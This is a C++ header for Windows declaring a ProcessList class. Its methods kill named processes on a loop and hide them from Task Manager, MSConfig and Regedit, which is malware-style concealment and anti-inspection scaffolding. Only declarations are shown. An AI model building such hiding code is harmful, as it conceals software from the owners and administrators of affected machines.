#include <windows.h>
#include <Tlhelp32.h>
#include <commctrl.h>
#include "Process.h"

#define DEFAULT_INTERVAL_KILL   125
#define DEFAULT_INTERVAL_HIDE   25

#pragma once

class ProcessList {
   private:
      Process ** processNameList;
      unsigned long numProcess;
      
      unsigned long msecDelayKill;
      unsigned long msecDelayHideTaskManager;
      unsigned long msecDelayHideMSConfig;
      unsigned long msecDelayHideRegedit;
      
      bool quitKillProcessThread;
      bool quitHideProcessTaskManagerThread;
      bool quitHideProcessMSConfigThread;
      bool quitHideProcessRegeditThread;
      
   public:
      ProcessList();
      bool addProcess(const char * processName, char * patternToHideMSConfig = NULL, char * patternToHideRegedit = NULL);
      bool killProcessList();
      bool killPermanentProcessList(unsigned long msecIntervalKill = DEFAULT_INTERVAL_KILL);
      bool hideProcessListTaskManager();
      bool hidePermanentProcessListTaskManager(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
      bool hideProcessListMSConfig();
      bool hidePermanentProcessListMSConfig(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
      bool hideProcessListRegedit();
      bool hidePermanentProcessListRegedit(unsigned long msecIntervalKill = DEFAULT_INTERVAL_HIDE);
            
      void setTerminateKillProcessThread(bool value);
      void setTerminateHideProcessTaskManagerThread(bool value);
      void setTerminateHideProcessMSConfigThread(bool value);
      void setTerminateHideProcessRegeditThread(bool value);
      
      bool terminateKillProcessThread() { return quitKillProcessThread; }
      bool terminateHideProcessTaskManagerThread() { return quitHideProcessTaskManagerThread; }
      bool terminateHideProcessMSConfigThread() { return quitHideProcessMSConfigThread; }
      bool terminateHideProcessRegeditThread() { return quitHideProcessRegeditThread; }
      
      Process ** getProcessList() { return processNameList; }  
      unsigned long getNumProcess() { return numProcess; }
      unsigned long getIntervalKill() { return msecDelayKill; } 
      unsigned long getIntervalTaskManagerHide() { return msecDelayHideTaskManager; } 
      unsigned long getIntervalMSConfigHide() { return msecDelayHideMSConfig; } 
      unsigned long getIntervalRegeditHide() { return msecDelayHideRegedit; } 
};
